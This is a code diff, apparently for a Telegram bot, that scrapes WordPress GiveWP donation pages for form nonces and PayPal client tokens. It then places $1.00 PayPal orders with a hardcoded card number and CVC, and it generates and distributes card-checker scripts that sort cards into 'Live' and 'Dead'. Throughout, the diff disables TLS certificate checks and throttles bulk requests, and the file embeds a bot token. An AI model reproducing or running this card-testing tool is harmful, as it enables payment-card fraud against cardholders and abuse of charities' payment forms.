@@ -12,6 +12,8 @@ from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
 from queue import Queue
 from concurrent.futures import ThreadPoolExecutor, as_completed
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # === بيانات البوت ===
 token = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
@@ -172,13 +174,13 @@ def ali_al2(massege):
             )
             return
 
-        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
-
-        if r.status_code != 200:
+        # استخدام check_link المحسنة
+        result = check_link(link)
+        if not result:
             bot.edit_message_text(
                 chat_id=massege.chat.id,
                 message_id=ko.message_id,
-                text=f"Site returned status: {r.status_code} ❌"
+                text="Site is not a valid PayPal gateway ❌"
             )
             return
 
@@ -188,12 +190,11 @@ def ali_al2(massege):
             text="Gate found ✅"
         )
 
-    except requests.exceptions.Timeout:
-        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="The site took too long to respond ⏳")
-        return
-    except requests.exceptions.ConnectionError:
-        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="Connection error or site offline ❌")
-        return
+        id_form1 = result['id_form1']
+        id_form2 = result['id_form2']
+        nonec = result['nonec']
+        au = result['au']
+
     except Exception as e:
         bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")
         return
@@ -201,145 +202,120 @@ def ali_al2(massege):
     try:
         user = generate_user_agent()
         r = requests.Session()
-        headers = {'user-agent': user}
-        res = r.get(url=f"{link}", headers=headers, timeout=15).text
         
-        # استخراج البيانات بنفس طريقة check_link المحسنة
-        result = check_link(link)
-        if not result:
+        parsed = urlparse(link)
+        USER_URL2 = f'https://{parsed.netloc}'
+        USER_URL = parsed.path
+
+        headers = {
+            'origin': f'{USER_URL2}',
+            'referer': f'{USER_URL}',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
+        }
+
+        data = MultipartEncoder({
+            'give-form-id-prefix': (None, id_form1),
+            'give-form-id': (None, id_form2),
+            'give-form-hash': (None, nonec),
+            'give-amount': (None, '1.00'),
+            'payment-mode': (None, 'paypal-commerce'),
+            'give_first': (None, 'Ali'),
+            'give_last': (None, 'rights and'),
+            'give_email': (None, 'Ali22@gmail.com'),
+            'give-gateway': (None, 'paypal-commerce'),
+        })
+        headers['content-type'] = data.content_type
+        params = {'action': 'give_paypal_commerce_create_order'}
+
+        response = r.post(
+            f'{USER_URL2}/wp-admin/admin-ajax.php',
+            params=params,
+            headers=headers,
+            data=data,
+            timeout=30,
+            verify=False
+        )
+        
+        try:
+            tok = response.json()['data']['id']
+        except:
             bot.edit_message_text(
                 chat_id=massege.chat.id,
                 message_id=ko.message_id,
-                text='''Data Client Token not found ⚠️''',
+                text='Token not In Data ❌',
                 parse_mode="HTML"
             )
             return
-        
-        id_form1 = result['id_form1']
-        id_form2 = result['id_form2']
-        nonec = result['nonec']
-        au = result['au']
-    except Exception as e:
-        bot.edit_message_text(
-            chat_id=massege.chat.id,
-            message_id=ko.message_id,
-            text=f'''Error extracting data ❌\n<code>{str(e)[:100]}</code>''',
-            parse_mode="HTML"
-        )
-        return
 
-    parsed = urlparse(link)
-    USER_URL2 = f'https://{parsed.netloc}'
-    USER_URL = parsed.path
-
-    headers = {
-        'origin': f'{USER_URL2}',
-        'referer': f'{USER_URL}',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    data = MultipartEncoder({
-        'give-form-id-prefix': (None, id_form1),
-        'give-form-id': (None, id_form2),
-        'give-form-hash': (None, nonec),
-        'give-amount': (None, '1.00'),
-        'payment-mode': (None, 'paypal-commerce'),
-        'give_first': (None, 'Ali'),
-        'give_last': (None, 'rights and'),
-        'give_email': (None, 'Ali22@gmail.com'),
-        'give-gateway': (None, 'paypal-commerce'),
-    })
-    headers['content-type'] = data.content_type
-    params = {'action': 'give_paypal_commerce_create_order'}
-
-    response = r.post(
-        f'{USER_URL2}/wp-admin/admin-ajax.php',
-        params=params,
-        cookies=r.cookies,
-        headers=headers,
-        data=data,
-        timeout=15
-    )
-    
-    try:
-        tok = response.json()['data']['id']
-    except:
-        bot.edit_message_text(
-            chat_id=massege.chat.id,
-            message_id=ko.message_id,
-            text='Token not In Data ❌',
-            parse_mode="HTML"
-        )
-        return
-
-    headers = {
-        'authorization': f'Bearer {au}',
-        'content-type': 'application/json',
-        'user-agent': user,
-    }
-    ccx = '4059986126444431|11|30|947'
-    ccx = ccx.strip()
-    n = ccx.split("|")[0]
-    mm = ccx.split("|")[1]
-    yy = ccx.split("|")[2]
-    cvc = ccx.split("|")[3]
-    if "20" in yy:
-        yy = yy.split("20")[1]
-    json_data = {
-        'payment_source': {
-            'card': {
-                'number': n,
-                'expiry': f'20{yy}-{mm}',
-                'security_code': cvc,
-                'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
+        headers = {
+            'authorization': f'Bearer {au}',
+            'content-type': 'application/json',
+            'user-agent': user,
+        }
+        ccx = '4059986126444431|11|30|947'
+        ccx = ccx.strip()
+        n = ccx.split("|")[0]
+        mm = ccx.split("|")[1]
+        yy = ccx.split("|")[2]
+        cvc = ccx.split("|")[3]
+        if "20" in yy:
+            yy = yy.split("20")[1]
+        json_data = {
+            'payment_source': {
+                'card': {
+                    'number': n,
+                    'expiry': f'20{yy}-{mm}',
+                    'security_code': cvc,
+                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
+                },
             },
-        },
-        'application_context': {'vault': False},
-    }
+            'application_context': {'vault': False},
+        }
 
-    response = r.post(
-        f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
-        headers=headers,
-        json=json_data,
-        timeout=15
-    )
+        response = r.post(
+            f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
+            headers=headers,
+            json=json_data,
+            timeout=30,
+            verify=False
+        )
 
-    data = MultipartEncoder({
-        'give-form-id-prefix': (None, id_form1),
-        'give-form-id': (None, id_form2),
-        'give-form-hash': (None, nonec),
-        'give-amount': (None, '1.00'),
-        'payment-mode': (None, 'paypal-commerce'),
-        'give_first': (None, 'Ali'),
-        'give_last': (None, 'rights and'),
-        'give_email': (None, 'Ali22@gmail.com'),
-        'give-gateway': (None, 'paypal-commerce'),
-    })
-    headers['content-type'] = data.content_type
-    params = {
-        'action': 'give_paypal_commerce_approve_order',
-        'order': tok,
-    }
+        data = MultipartEncoder({
+            'give-form-id-prefix': (None, id_form1),
+            'give-form-id': (None, id_form2),
+            'give-form-hash': (None, nonec),
+            'give-amount': (None, '1.00'),
+            'payment-mode': (None, 'paypal-commerce'),
+            'give_first': (None, 'Ali'),
+            'give_last': (None, 'rights and'),
+            'give_email': (None, 'Ali22@gmail.com'),
+            'give-gateway': (None, 'paypal-commerce'),
+        })
+        headers['content-type'] = data.content_type
+        params = {
+            'action': 'give_paypal_commerce_approve_order',
+            'order': tok,
+        }
 
-    response = r.post(
-        f'{USER_URL2}/wp-admin/admin-ajax.php',
-        params=params,
-        cookies=r.cookies,
-        headers=headers,
-        data=data,
-        timeout=15
-    )
-    
-    if 'ORDER_NOT_APPROVED' in response.text:
-        msg = 'Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction.'
-    else:
-        try:
-            msg = response.json()['data']['error']
-        except:
-            msg = html.escape(response.text[:100])
+        response = r.post(
+            f'{USER_URL2}/wp-admin/admin-ajax.php',
+            params=params,
+            headers=headers,
+            data=data,
+            timeout=30,
+            verify=False
+        )
+        
+        if 'ORDER_NOT_APPROVED' in response.text:
+            msg = 'Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction.'
+        else:
+            try:
+                msg = response.json()['data']['error']
+            except:
+                msg = html.escape(response.text[:100])
 
-    text_content = f'''# PayPal Gateway
+        text_content = f'''# PayPal Gateway
 # Link: {link}
 import requests, re, random, time, base64
 from fake_useragent import UserAgent
@@ -388,7 +364,7 @@ class PayPal:
         }})
         he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
         pa1 = {{'action': 'give_paypal_commerce_create_order'}}
-        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']
+        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2, verify=False).json()['data']['id']
 
         he4 = {{
             'authorization': f'Bearer {{self.au}}',
@@ -404,7 +380,7 @@ class PayPal:
             }},
             'application_context': {{'vault': False}},
         }}
-        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)
+        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3, verify=False)
 
         da4 = MultipartEncoder({{
             'give-form-id-prefix': (None, self.id_form1),
@@ -419,7 +395,7 @@ class PayPal:
         }})
         he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
         pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
-        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
+        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4, verify=False)
         
         text = r5.text
         if 'true' in text: return 'CHARGE 1.00$'
@@ -467,14 +443,14 @@ if __name__ == '__main__':
                 time.sleep(1)
             print(f'Total: {{noy}} | Live: {{live}} | Dead: {{dead}}')'''
 
-    file_name = f'@nnunrr_{massege.from_user.id}.py'
-    with open(file_name, "w", encoding="utf-8") as f:
-        f.write(text_content)
-    with open(file_name, "rb") as f:
-        bot.send_document(
-            chat_id=massege.chat.id,
-            document=f,
-            caption=f'''The gate was successfully withdrawn ✅
+        file_name = f'@nnunrr_{massege.from_user.id}.py'
+        with open(file_name, "w", encoding="utf-8") as f:
+            f.write(text_content)
+        with open(file_name, "rb") as f:
+            bot.send_document(
+                chat_id=massege.chat.id,
+                document=f,
+                caption=f'''The gate was successfully withdrawn ✅
 ━━━━━━━━━━━━━━━━━━━━
 <strong>Gateway information ...</strong>
 
@@ -487,9 +463,12 @@ id payment: <code>{tok}</code>
 msg gateway: <code>{msg}</code>
 ━━━━━━━━━━━━━━━━━━━━
 Dev: @nnunrr''',
-            parse_mode="HTML"
-        )
-    os.remove(file_name)
+                parse_mode="HTML"
+            )
+        os.remove(file_name)
+
+    except Exception as e:
+        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")
 
 # ============ أمر bulk ============
 @bot.message_handler(commands=['bulk'])
@@ -557,65 +536,76 @@ def handle_bulk_file(message):
         bot.reply_to(message, "Use /bulk first to start bulk extraction.")
 
 def check_link(link):
-    """فحص رابط PayPal - يدعم كل أنواع PayPal Commerce"""
+    """فحص رابط PayPal - بطيء ودقيق"""
     try:
         if not link.startswith(("http://", "https://")):
             return None
 
-        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=15, allow_redirects=True)
+        session = requests.Session()
+        session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+        
+        try:
+            r = session.get(link, timeout=30, allow_redirects=True, verify=False)
+        except:
+            time.sleep(2)
+            try:
+                r = session.get(link, timeout=30, allow_redirects=True, verify=False)
+            except:
+                return None
+        
         if r.status_code != 200:
             return None
 
         res = r.text
         
-        # ============ البحث عن client token بكل الطرق الممكنة ============
         au = None
         enc = None
         
-        # الطريقة 1: data-client-token في HTML
-        anc1 = re.search(r'"data-client-token":"(.*?)"', res)
-        if anc1:
-            enc = anc1.group(1)
+        patterns = [
+            r'"data-client-token":"(.*?)"',
+            r"data-client-token='(.*?)'",
+            r'data-client-token=([^"\'\s>]+)',
+            r'clientToken["\']?\s*:\s*["\'](.*?)["\']',
+            r'name="client-token"\s+content="(.*?)"',
+            r'data-client-token\s*=\s*["\'](.*?)["\']',
+            r'"clientToken":"(.*?)"',
+            r"clientToken='(.*?)'",
+            r'clientToken=([^"\'\s>]+)',
+            r'"client_token":"(.*?)"',
+            r"client_token='(.*?)'",
+            r'client_token=([^"\'\s>]+)',
+        ]
         
-        # الطريقة 2: data-client-token='...'
-        if not enc:
-            anc2 = re.search(r"data-client-token='(.*?)'", res)
-            if anc2:
-                enc = anc2.group(1)
+        for pattern in patterns:
+            match = re.search(pattern, res)
+            if match:
+                enc = match.group(1)
+                break
         
-        # الطريقة 3: data-client-token= بدون quotes
         if not enc:
-            anc3 = re.search(r'data-client-token=([^"\'\s>]+)', res)
-            if anc3:
-                enc = anc3.group(1)
-        
-        # الطريقة 4: clientToken في JavaScript
-        if not enc:
-            anc4 = re.search(r'clientToken["\']?\s*:\s*["\'](.*?)["\']', res)
-            if anc4:
-                enc = anc4.group(1)
-        
-        # الطريقة 5: client_token في meta tag
-        if not enc:
-            anc5 = re.search(r'name="client-token"\s+content="(.*?)"', res)
-            if anc5:
-                enc = anc5.group(1)
-        
-        # الطريقة 6: data-client-token في أي مكان
-        if not enc:
-            anc6 = re.search(r'data-client-token\s*=\s*["\'](.*?)["\']', res)
-            if anc6:
-                enc = anc6.group(1)
+            token_patterns = [
+                r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
+                r'[A-Za-z0-9+/=]{50,}',
+            ]
+            for pattern in token_patterns:
+                match = re.search(pattern, res)
+                if match:
+                    enc = match.group(0)
+                    break
         
         if not enc:
             return None
         
-        # فك التشفير - ممكن يكون base64 أو عادي
         try:
-            dec = base64.b64decode(enc).decode('utf-8')
+            padded = enc + '=' * (-len(enc) % 4)
+            dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
             au_match = re.search(r'"accessToken":"(.*?)"', dec)
             if au_match:
                 au = au_match.group(1)
+            else:
+                au_match2 = re.search(r'accessToken["\']?\s*:\s*["\'](.*?)["\']', dec)
+                if au_match2:
+                    au = au_match2.group(1)
         except:
             au_match = re.search(r'"accessToken":"(.*?)"', enc)
             if au_match:
@@ -628,83 +618,68 @@ def check_link(link):
         if not au:
             return None
         
-        # ============ البحث عن form fields بكل الطرق ============
         id_form1 = None
         id_form2 = None
         nonec = None
         
-        # give-form-id-prefix
-        m1 = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', res)
-        if not m1:
-            m1 = re.search(r"name='give-form-id-prefix'\s+value='(.*?)'", res)
-        if not m1:
-            m1 = re.search(r'name="give-form-id-prefix"\s+value=\'(.*?)\'', res)
-        if not m1:
-            m1 = re.search(r'value="(.*?)"\s+name="give-form-id-prefix"', res)
-        if not m1:
-            m1 = re.search(r'<input[^>]*give-form-id-prefix[^>]*value=["\']([^"\']*)["\']', res)
-        if not m1:
-            m1 = re.search(r'type=["\']hidden["\'][^>]*name=["\']give-form-id-prefix["\'][^>]*value=["\'](.*?)["\']', res)
+        form_patterns_1 = [
+            r'name="give-form-id-prefix"\s+value="(.*?)"',
+            r"name='give-form-id-prefix'\s+value='(.*?)'",
+            r'name="give-form-id-prefix"\s+value=\'(.*?)\'',
+            r'value="(.*?)"\s+name="give-form-id-prefix"',
+            r'<input[^>]*give-form-id-prefix[^>]*value=["\']([^"\']*)["\']',
+            r'type=["\']hidden["\'][^>]*name=["\']give-form-id-prefix["\'][^>]*value=["\'](.*?)["\']',
+            r'give-form-id-prefix["\']?\s*:\s*["\'](.*?)["\']',
+            r'name=["\']give-form-id-prefix["\'][^>]*value=["\']([^"\']*)["\']',
+        ]
         
-        if m1:
-            id_form1 = m1.group(1)
+        for pattern in form_patterns_1:
+            match = re.search(pattern, res)
+            if match:
+                id_form1 = match.group(1)
+                break
         
-        # give-form-id
-        m2 = re.search(r'name="give-form-id"\s+value="(.*?)"', res)
-        if not m2:
-            m2 = re.search(r"name='give-form-id'\s+value='(.*?)'", res)
-        if not m2:
-            m2 = re.search(r'name="give-form-id"\s+value=\'(.*?)\'', res)
-        if not m2:
-            m2 = re.search(r'value="(.*?)"\s+name="give-form-id"', res)
-        if not m2:
-            m2 = re.search(r'<input[^>]*give-form-id[^>]*value=["\']([^"\']*)["\']', res)
-        if not m2:
-            m2 = re.search(r'type=["\']hidden["\'][^>]*name=["\']give-form-id["\'][^>]*value=["\'](.*?)["\']', res)
+        form_patterns_2 = [
+            r'name="give-form-id"\s+value="(.*?)"',
+            r"name='give-form-id'\s+value='(.*?)'",
+            r'name="give-form-id"\s+value=\'(.*?)\'',
+            r'value="(.*?)"\s+name="give-form-id"',
+            r'<input[^>]*give-form-id[^>]*value=["\']([^"\']*)["\']',
+            r'type=["\']hidden["\'][^>]*name=["\']give-form-id["\'][^>]*value=["\'](.*?)["\']',
+            r'give-form-id["\']?\s*:\s*["\'](.*?)["\']',
+            r'name=["\']give-form-id["\'][^>]*value=["\']([^"\']*)["\']',
+        ]
         
-        if m2:
-            id_form2 = m2.group(1)
+        for pattern in form_patterns_2:
+            match = re.search(pattern, res)
+            if match:
+                id_form2 = match.group(1)
+                break
         
-        # give-form-hash
-        m3 = re.search(r'name="give-form-hash"\s+value="(.*?)"', res)
-        if not m3:
-            m3 = re.search(r"name='give-form-hash'\s+value='(.*?)'", res)
-        if not m3:
-            m3 = re.search(r'name="give-form-hash"\s+value=\'(.*?)\'', res)
-        if not m3:
-            m3 = re.search(r'value="(.*?)"\s+name="give-form-hash"', res)
-        if not m3:
-            m3 = re.search(r'<input[^>]*give-form-hash[^>]*value=["\']([^"\']*)["\']', res)
-        if not m3:
-            m3 = re.search(r'type=["\']hidden["\'][^>]*name=["\']give-form-hash["\'][^>]*value=["\'](.*?)["\']', res)
+        form_patterns_3 = [
+            r'name="give-form-hash"\s+value="(.*?)"',
+            r"name='give-form-hash'\s+value='(.*?)'",
+            r'name="give-form-hash"\s+value=\'(.*?)\'',
+            r'value="(.*?)"\s+name="give-form-hash"',
+            r'<input[^>]*give-form-hash[^>]*value=["\']([^"\']*)["\']',
+            r'type=["\']hidden["\'][^>]*name=["\']give-form-hash["\'][^>]*value=["\'](.*?)["\']',
+            r'give-form-hash["\']?\s*:\s*["\'](.*?)["\']',
+            r'name=["\']give-form-hash["\'][^>]*value=["\']([^"\']*)["\']',
+        ]
         
-        if m3:
-            nonec = m3.group(1)
+        for pattern in form_patterns_3:
+            match = re.search(pattern, res)
+            if match:
+                nonec = match.group(1)
+                break
         
-        # ============ طرق بديلة ============
-        if not id_form1:
-            m1_alt = re.search(r'give-form-id-prefix["\']?\s*:\s*["\'](.*?)["\']', res)
-            if m1_alt:
-                id_form1 = m1_alt.group(1)
-        
-        if not id_form2:
-            m2_alt = re.search(r'give-form-id["\']?\s*:\s*["\'](.*?)["\']', res)
-            if m2_alt:
-                id_form2 = m2_alt.group(1)
-        
-        if not nonec:
-            m3_alt = re.search(r'give-form-hash["\']?\s*:\s*["\'](.*?)["\']', res)
-            if m3_alt:
-                nonec = m3_alt.group(1)
-        
-        # ============ البحث في hidden fields ============
         if not id_form1 or not id_form2 or not nonec:
-            hidden_fields = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', res)
+            hidden_fields = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', res, re.IGNORECASE)
             for field in hidden_fields:
-                name_match = re.search(r'name=["\'](.*?)["\']', field)
-                value_match = re.search(r'value=["\'](.*?)["\']', field)
+                name_match = re.search(r'name=["\'](.*?)["\']', field, re.IGNORECASE)
+                value_match = re.search(r'value=["\'](.*?)["\']', field, re.IGNORECASE)
                 if name_match and value_match:
-                    name = name_match.group(1)
+                    name = name_match.group(1).lower()
                     value = value_match.group(1)
                     if 'give-form-id-prefix' in name and not id_form1:
                         id_form1 = value
@@ -713,7 +688,21 @@ def check_link(link):
                     elif 'give-form-hash' in name and not nonec:
                         nonec = value
         
-        # ============ التحقق النهائي ============
+        if not id_form1:
+            js_match = re.search(r'give_form_id_prefix\s*=\s*["\'](.*?)["\']', res)
+            if js_match:
+                id_form1 = js_match.group(1)
+        
+        if not id_form2:
+            js_match = re.search(r'give_form_id\s*=\s*["\'](.*?)["\']', res)
+            if js_match:
+                id_form2 = js_match.group(1)
+        
+        if not nonec:
+            js_match = re.search(r'give_form_hash\s*=\s*["\'](.*?)["\']', res)
+            if js_match:
+                nonec = js_match.group(1)
+        
         if not all([id_form1, id_form2, nonec, au]):
             return None
         
@@ -783,7 +772,7 @@ def process_bulk_file(message):
         def update_status_loop():
             last_text = ""
             while not stop_event.is_set():
-                time.sleep(3)
+                time.sleep(2)
                 with progress['lock']:
                     processed = progress['processed']
                     live = progress['live']
@@ -815,10 +804,10 @@ def process_bulk_file(message):
         updater = threading.Thread(target=update_status_loop, daemon=True)
         updater.start()
 
-        # ============ نظام الدفعات المتعدد الحماية ============
-        batch_size = 30
-        max_workers = 5
-        rest_time = 0.3
+        # ============ فحص بطيء ودقيق ============
+        batch_size = 10
+        max_workers = 3
+        rest_time = 0.5
         
         for i in range(0, total, batch_size):
             if stop_event.is_set():
@@ -890,16 +879,16 @@ Dev: @nnunrr"""
                                 pass
                         else:
                             progress['dead'] += 1
-                    time.sleep(0.1)
+                    time.sleep(1)
             
             del batch_links
             del future_to_link
             cleanup_memory()
             time.sleep(rest_time)
             
-            if (i // batch_size) % 10 == 0:
+            if (i // batch_size) % 5 == 0:
                 gc.collect()
-                time.sleep(0.5)
+                time.sleep(1)
 
         stop_event.set()
         updater.join(timeout=1)
@@ -963,6 +952,8 @@ import requests, re, random, time, base64
 from fake_useragent import UserAgent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class PayPal{file_num}_{idx}:
     def __init__(self):
@@ -1004,7 +995,7 @@ class PayPal{file_num}_{idx}:
         }})
         he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
         pa1 = {{'action': 'give_paypal_commerce_create_order'}}
-        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']
+        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2, verify=False).json()['data']['id']
 
         he4 = {{
             'authorization': f'Bearer {{self.au}}',
@@ -1020,7 +1011,7 @@ class PayPal{file_num}_{idx}:
             }},
             'application_context': {{'vault': False}},
         }}
-        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)
+        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3, verify=False)
 
         da4 = MultipartEncoder({{
             'give-form-id-prefix': (None, self.id_form1),
@@ -1035,7 +1026,7 @@ class PayPal{file_num}_{idx}:
         }})
         he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
         pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
-        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
+        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4, verify=False)
         
         text = r5.text
         if 'true' in text: return 'CHARGE 1.00$'
